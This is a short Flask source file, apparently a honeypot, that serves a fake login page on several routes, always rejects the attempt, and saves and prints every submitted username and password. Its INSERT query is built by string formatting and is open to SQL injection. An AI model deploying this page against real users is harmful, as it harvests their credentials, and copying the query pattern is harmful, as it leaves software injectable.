"""
Author: Ben Bornholm
Date: 11-20-17
Description: Default web server
"""
from app import app, cursor, db
from flask import Flask, render_template, request, url_for
import sqlite3

"""
Slack messager
"""

"""
Store usernames and passwords to database
"""
def add_entry(username, password):
    cursor.execute('''INSERT INTO creds (username, password) VALUES ('{0}','{1}')'''.format(username, password))
    db.commit()

"""
Default route and routes to login page
"""
@app.route('/', methods=['GET', 'POST'])
@app.route('/login', methods=['GET', 'POST'])
@app.route('/admin/login', methods=['GET', 'POST'])
def login():
    error = 'Invalid Credentials. Please try again.'
    if request.method == 'POST':
        add_entry(request.form['username'], request.form['password'])
        print request.form['username']
        print request.form['password']

    return render_template('login.html', error=error)
